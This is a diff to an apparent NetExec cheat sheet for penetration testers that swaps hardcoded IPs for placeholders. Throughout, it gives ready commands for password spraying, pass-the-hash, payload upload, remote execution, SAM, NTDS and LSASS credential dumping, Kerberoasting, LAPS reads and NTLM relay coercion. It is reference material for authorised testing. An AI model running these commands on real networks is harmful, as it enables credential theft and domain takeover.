@@ -8,7 +8,7 @@
 ## Core Syntax
 
 ```bash
-nxc <protocol> <target> [auth] [action]
+nxc <protocol> $IP [auth] [action]
 ```
 
 !!! tip "Non-standard Port"
@@ -19,10 +19,10 @@ Common target forms:
 
 | Target type | Example |
 |-------------|---------|
-| Single host | `nxc smb 10.10.10.10` |
-| CIDR range | `nxc smb 10.10.10.0/24` |
-| IP range | `nxc smb 10.10.10.10-50` |
-| FQDN | `nxc smb dc01.corp.local` |
+| Single host | `nxc smb $IP` |
+| CIDR range | `nxc smb $SUBNET` |
+| IP range | `nxc smb $IP-50` |
+| FQDN | `nxc smb $DC_IP` |
 | Target file | `nxc smb targets.txt` |
 | Nmap XML | `nxc smb scan.xml` |
 
@@ -46,7 +46,7 @@ Syntax checkpoints:
 | Need | Use |
 |------|-----|
 | Target file | `nxc smb targets.txt` |
-| LDAP over TLS | `nxc ldap <target> --port 636` |
+| LDAP over TLS | `nxc ldap $DC_IP --port 636` |
 | Kerberos auth | Add `-k`, `--use-kcache`, or `--aesKey` to a supported protocol. |
 | Command execution | `-x` for cmd.exe, `-X` for PowerShell. |
 | Leading-dash creds | `-u='-svc' -p='-Password123!'` |
@@ -56,17 +56,17 @@ Syntax checkpoints:
 ## Authentication
 
 ```bash
-nxc smb 10.10.10.10 -u alice -p 'Winter2026!' -d corp.local
-nxc smb 10.10.10.10 -u Administrator -p 'Password1!' --local-auth
-nxc smb 10.10.10.10 -u alice -H <ntlm-hash>
-nxc smb 10.10.10.10 -id 7
+nxc smb $IP -u alice -p 'Winter2026!' -d $DOMAIN
+nxc smb $IP -u Administrator -p 'Password1!' --local-auth
+nxc smb $IP -u alice -H <ntlm-hash>
+nxc smb $IP -id 7
 ```
 
 | Option | Purpose |
 |--------|---------|
 | `-u <user>` | Username, local account name, or user list. |
 | `-p <password>` | Password or password list. |
-| `-d <domain>` | Domain context for AD auth. |
+| `-d $DOMAIN` | Domain context for AD auth. |
 | `--local-auth` | Authenticate against the target's local SAM instead of the domain. |
 | `-H <ntlm-hash>` | Pass-the-hash; NT hash alone is enough. |
 | `-id <cred-id>` | Pull a saved credential from `nxcdb`. |
@@ -77,10 +77,10 @@ nxc smb 10.10.10.10 -id 7
 Use FQDN targets for Kerberos. Fix DNS first; most "Kerberos is broken" failures are name-resolution or SPN failures.
 
 ```bash
-nxc smb dc01.corp.local -u alice -p 'Winter2026!' -k -d corp.local --dns-server 10.10.10.10
+nxc smb $DC_IP -u alice -p 'Winter2026!' -k -d $DOMAIN --dns-server $DC_IP
 export KRB5CCNAME=/loot/alice.ccache
-nxc smb dc01.corp.local --use-kcache
-nxc smb dc01.corp.local -u alice -p 'Winter2026!' -d corp.local --generate-tgt alice.ccache
+nxc smb $DC_IP --use-kcache
+nxc smb $DC_IP -u alice -p 'Winter2026!' -d $DOMAIN --generate-tgt alice.ccache
 ```
 
 | Option | Purpose |
@@ -96,15 +96,15 @@ nxc smb dc01.corp.local -u alice -p 'Winter2026!' -d corp.local --generate-tgt a
 For LDAP Kerberos, pin the KDC when name resolution is fragile:
 
 ```bash
-nxc ldap dc01.corp.local -u alice -p 'Winter2026!' -k -d corp.local --kdcHost dc01.corp.local --dns-server 10.10.10.10
-nxc ldap dc01.corp.local --use-kcache --kdcHost dc01.corp.local
+nxc ldap $DC_IP -u alice -p 'Winter2026!' -k -d $DOMAIN --kdcHost $DC_IP --dns-server $DC_IP
+nxc ldap $DC_IP --use-kcache --kdcHost $DC_IP
 ```
 
 ### Certificates
 
 ```bash
-nxc smb dc01.corp.local --pfx-cert alice.pfx --pfx-pass 'pfx-password' -u alice
-nxc smb dc01.corp.local --pem-cert alice.pem --pem-key alice.key -u alice
+nxc smb $DC_IP --pfx-cert alice.pfx --pfx-pass 'pfx-password' -u alice
+nxc smb $DC_IP --pem-cert alice.pem --pem-key alice.key -u alice
 ```
 
 Successful cert auth writes a ccache under `~/.nxc/`; reuse it with `--use-kcache`.
@@ -114,9 +114,9 @@ Successful cert auth writes a ccache under `~/.nxc/`; reuse it with `--use-kcach
 ## DNS Helpers
 
 ```bash
-nxc ldap dc01.corp.local -u alice -p '...' --dns-server 10.10.10.10
-nxc smb 10.10.10.0/24 -u alice -p '...' --generate-hosts-file hosts.txt
-nxc smb dc01.corp.local -u alice -p '...' --generate-krb5-file krb5.conf
+nxc ldap $DC_IP -u alice -p '...' --dns-server $DC_IP
+nxc smb $SUBNET -u alice -p '...' --generate-hosts-file hosts.txt
+nxc smb $DC_IP -u alice -p '...' --generate-krb5-file krb5.conf
 ```
 
 | Option | Purpose |
@@ -135,9 +135,9 @@ nxc smb dc01.corp.local -u alice -p '...' --generate-krb5-file krb5.conf
 Pull policy first; lockout thresholds are not guesswork.
 
 ```bash
-nxc smb 10.10.10.10 -u alice -p '...' --pass-pol
-nxc smb 10.10.10.10 -u users.txt -p 'Spring2026!' --continue-on-success
-nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+nxc smb $IP -u alice -p '...' --pass-pol
+nxc smb $IP -u users.txt -p 'Spring2026!' --continue-on-success
+nxc smb $IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
 ```
 
 | Option | Purpose |
@@ -160,7 +160,7 @@ nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-
 ### Access Check
 
 ```bash
-nxc smb 10.10.10.0/24 -u alice -p 'Winter2026!' -d corp.local
+nxc smb $SUBNET -u alice -p 'Winter2026!' -d $DOMAIN
 ```
 
 | Option | Purpose |
@@ -172,9 +172,9 @@ nxc smb 10.10.10.0/24 -u alice -p 'Winter2026!' -d corp.local
 ### Shares And Files
 
 ```bash
-nxc smb 10.10.10.10 -u alice -p '...' --shares
-nxc smb 10.10.10.10 -u admin -p '...' --share C$ --put-file ./payload.exe '\\Windows\\Temp\\payload.exe'
-nxc smb 10.10.10.10 -u admin -p '...' --share C$ --get-file '\\Users\\alice\\Desktop\\loot.txt' loot.txt
+nxc smb $IP -u alice -p '...' --shares
+nxc smb $IP -u admin -p '...' --share C$ --put-file ./payload.exe '\\Windows\\Temp\\payload.exe'
+nxc smb $IP -u admin -p '...' --share C$ --get-file '\\Users\\alice\\Desktop\\loot.txt' loot.txt
 ```
 
 | Option | Purpose |
@@ -192,8 +192,8 @@ nxc smb 10.10.10.10 -u admin -p '...' --share C$ --get-file '\\Users\\alice\\Des
 ### Share Looting
 
 ```bash
-nxc smb 10.10.10.10 -u alice -p '...' --spider 'Departments' --pattern password creds secret --depth 5 --content
-nxc smb 10.10.10.10 -u alice -p '...' -M spider_plus -o DOWNLOAD_FLAG=False EXCLUDE_FILTER='IPC$,print$'
+nxc smb $IP -u alice -p '...' --spider 'Departments' --pattern password creds secret --depth 5 --content
+nxc smb $IP -u alice -p '...' -M spider_plus -o DOWNLOAD_FLAG=False EXCLUDE_FILTER='IPC$,print$'
 ```
 
 | Option | Purpose |
@@ -212,8 +212,8 @@ nxc smb 10.10.10.10 -u alice -p '...' -M spider_plus -o DOWNLOAD_FLAG=False EXCL
 ### Command Execution
 
 ```bash
-nxc smb 10.10.10.10 -u admin -p '...' -x 'whoami /all'
-nxc smb 10.10.10.10 -u admin -p '...' -X '$PSVersionTable'
+nxc smb $IP -u admin -p '...' -x 'whoami /all'
+nxc smb $IP -u admin -p '...' -X '$PSVersionTable'
 ```
 
 | Option | Purpose |
@@ -236,8 +236,8 @@ Valid `--exec-method` values: `wmiexec`, `mmcexec`, `smbexec`, `atexec`.
 ### Credential Dumping
 
 ```bash
-nxc smb 10.10.10.10 -u Administrator -H <ntlm-hash> --sam
-nxc smb dc01.corp.local -u DA-user -p '...' --ntds --enabled
+nxc smb $IP -u Administrator -H <ntlm-hash> --sam
+nxc smb $DC_IP -u DA-user -p '...' --ntds --enabled
 ```
 
 | Option | Purpose |
@@ -260,7 +260,7 @@ nxc smb dc01.corp.local -u DA-user -p '...' --ntds --enabled
 Use the same base shape as access checks:
 
 ```bash
-nxc smb 10.10.10.10 -u alice -p '...' <flag>
+nxc smb $IP -u alice -p '...' <flag>
 ```
 
 | Option | Purpose |
@@ -277,9 +277,9 @@ nxc smb 10.10.10.10 -u alice -p '...' <flag>
 ### LAPS
 
 ```bash
-nxc smb 10.10.10.10 -u laps-reader -p '...' --laps
-nxc ldap dc01.corp.local -u laps-reader -p '...' --query '(ms-Mcs-AdmPwd=*)' 'sAMAccountName ms-Mcs-AdmPwd'
-nxc ldap dc01.corp.local -u laps-reader -p '...' --query '(msLAPS-Password=*)' 'sAMAccountName msLAPS-Password'
+nxc smb $IP -u laps-reader -p '...' --laps
+nxc ldap $DC_IP -u laps-reader -p '...' --query '(ms-Mcs-AdmPwd=*)' 'sAMAccountName ms-Mcs-AdmPwd'
+nxc ldap $DC_IP -u laps-reader -p '...' --query '(msLAPS-Password=*)' 'sAMAccountName msLAPS-Password'
 ```
 
 | Option | Purpose |
@@ -292,9 +292,9 @@ nxc ldap dc01.corp.local -u laps-reader -p '...' --query '(msLAPS-Password=*)' '
 ### Relay / Coercion Prep
 
 ```bash
-nxc smb 10.10.10.0/24 --gen-relay-list relay-targets.txt
+nxc smb $SUBNET --gen-relay-list relay-targets.txt
 impacket-ntlmrelayx -tf relay-targets.txt -smb2support
-nxc smb 10.10.10.10 -u '' -p '' -M coerce_plus -o LISTENER=10.10.14.3 METHOD=PetitPotam
+nxc smb $IP -u '' -p '' -M coerce_plus -o LISTENER=$LHOST METHOD=PetitPotam
 ```
 
 | Option | Purpose |
@@ -315,7 +315,7 @@ nxc smb 10.10.10.10 -u '' -p '' -M coerce_plus -o LISTENER=10.10.14.3 METHOD=Pet
 Use:
 
 ```bash
-nxc ldap dc01.corp.local -u alice -p '...' <flag>
+nxc ldap $DC_IP -u alice -p '...' <flag>
 ```
 
 | Option | Purpose |
@@ -334,8 +334,8 @@ nxc ldap dc01.corp.local -u alice -p '...' <flag>
 ### Roasting
 
 ```bash
-nxc ldap dc01.corp.local -u alice -p '...' --kerberoasting kerb.hashes
-nxc ldap dc01.corp.local -u alice -p '...' --asreproast asrep.hashes
+nxc ldap $DC_IP -u alice -p '...' --kerberoasting kerb.hashes
+nxc ldap $DC_IP -u alice -p '...' --asreproast asrep.hashes
 ```
 
 | Option | Purpose |
@@ -348,7 +348,7 @@ nxc ldap dc01.corp.local -u alice -p '...' --asreproast asrep.hashes
 ### BloodHound
 
 ```bash
-nxc ldap dc01.corp.local -u alice -p '...' --bloodhound -c DCOnly --dns-server 10.10.10.10
+nxc ldap $DC_IP -u alice -p '...' --bloodhound -c DCOnly --dns-server $DC_IP
 ```
 
 | Option | Purpose |
@@ -361,7 +361,7 @@ nxc ldap dc01.corp.local -u alice -p '...' --bloodhound -c DCOnly --dns-server 1
 ### Misconfiguration Hunts
 
 ```bash
-nxc ldap dc01.corp.local -u alice -p '...' --query '(&(objectCategory=person)(servicePrincipalName=*))' 'sAMAccountName servicePrincipalName'
+nxc ldap $DC_IP -u alice -p '...' --query '(&(objectCategory=person)(servicePrincipalName=*))' 'sAMAccountName servicePrincipalName'
 ```
 
 | Option | Purpose |
@@ -378,9 +378,9 @@ nxc ldap dc01.corp.local -u alice -p '...' --query '(&(objectCategory=person)(se
 ## WinRM
 
 ```bash
-nxc winrm 10.10.10.10 -u alice -p '...' -d corp.local
-nxc winrm 10.10.10.10 -u alice -p '...' -x 'whoami /priv'
-nxc winrm 10.10.10.10 -u admin -p '...' --put-file payload.exe 'C:\\Windows\\Temp\\payload.exe'
+nxc winrm $IP -u alice -p '...' -d $DOMAIN
+nxc winrm $IP -u alice -p '...' -x 'whoami /priv'
+nxc winrm $IP -u admin -p '...' --put-file payload.exe 'C:\\Windows\\Temp\\payload.exe'
 ```
 
 | Option | Purpose |
@@ -404,15 +404,15 @@ WinRM checks `5985` and `5986` by default. Pin protocol and port when only one t
 ## MSSQL
 
 ```bash
-nxc mssql 10.10.10.10 -u sa -p '...' --local-auth
-nxc mssql 10.10.10.10 -u alice -p '...' -d corp.local -q 'SELECT @@version'
-nxc mssql 10.10.10.10 -u sa -p '...' --local-auth -x 'whoami'
+nxc mssql $IP -u sa -p '...' --local-auth
+nxc mssql $IP -u alice -p '...' -d $DOMAIN -q 'SELECT @@version'
+nxc mssql $IP -u sa -p '...' --local-auth -x 'whoami'
 ```
 
 | Option | Purpose |
 |--------|---------|
 | `--local-auth` | Use SQL auth instead of Windows domain auth. |
-| `-d <domain>` | Use Windows domain auth to SQL Server. |
+| `-d $DOMAIN` | Use Windows domain auth to SQL Server. |
 | `-q '<query>'` | Run a SQL query. |
 | `--database` | List databases. |
 | `--database <name>` | Select a database. |
@@ -431,9 +431,9 @@ nxc mssql 10.10.10.10 -u sa -p '...' --local-auth -x 'whoami'
 ## Other Protocols
 
 ```bash
-nxc ssh 10.10.10.10 -u root -p 'toor' -x 'id'
-nxc rdp 10.10.10.10 -u alice -p '...' --screenshot
-nxc nfs 10.10.10.10 --shares
+nxc ssh $IP -u root -p 'toor' -x 'id'
+nxc rdp $IP -u alice -p '...' --screenshot
+nxc nfs $IP --shares
 ```
 
 | Protocol | Options | Purpose |
@@ -461,8 +461,8 @@ nxc nfs 10.10.10.10 --shares
 ```bash
 nxc smb -L
 nxc smb -M lsassy --options
-nxc smb 10.10.10.10 -u admin -p '...' -M lsassy
-nxc smb 10.10.10.10 -u admin -p '...' -M nanodump -o TMP_DIR='C:\\Windows\\Temp'
+nxc smb $IP -u admin -p '...' -M lsassy
+nxc smb $IP -u admin -p '...' -M nanodump -o TMP_DIR='C:\\Windows\\Temp'
 ```
 
 | Option | Purpose |
@@ -497,7 +497,7 @@ nxcdb (engagement-q2-2026)(smb)> hosts
 nxcdb (engagement-q2-2026)(smb)> export creds detailed creds.csv
 nxcdb (engagement-q2-2026)(smb)> export shares simple shares.csv
 
-nxc smb 10.10.10.10 -id 7
+nxc smb $IP -id 7
 ```
 
 Workspaces live under `~/.nxc/workspaces`. Keep client workspaces separate.
